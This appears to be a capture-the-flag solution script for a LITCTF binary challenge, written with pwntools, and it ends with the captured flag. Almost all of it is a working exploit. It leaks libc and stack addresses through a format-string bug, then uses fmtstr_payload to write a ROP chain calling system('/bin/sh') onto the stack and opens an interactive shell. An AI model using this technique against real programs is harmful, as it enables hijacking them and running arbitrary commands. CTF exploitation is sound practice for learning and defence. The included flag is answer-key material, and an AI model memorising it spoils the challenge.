from pwn import *



elf = context.binary = ELF("main")
p = process()
# p = remote("litctf.org", 31772)


# leaks
leaks = []
for i in range(4):
    p.sendline(f"%{i}$p")
    leak = p.recvline()
    leaks.append(leak.strip())
    print(i,leak)


# parse leaks
libc_leak = int(leaks[1],16)
stack_leak = int(leaks[2],16)
print(hex(libc_leak))
print(hex(stack_leak))

libc = elf.libc
libc.address = libc_leak - 0x3c3770
rop = ROP(libc)


# one gadget in stack, when printf returns 
payload = fmtstr_payload(8,{
    stack_leak - 0x18 + 0x8 * 0 : rop.rdi.address,
    stack_leak - 0x18 + 0x8 * 1 : next(libc.search(b"/bin/sh\x00")),
    stack_leak - 0x18 + 0x8 * 2 : libc.sym.system,
})

p.sendline(payload)

p.interactive()

# LITCTF{I_shall_NEVER_disable_RELRO_86ea64d5}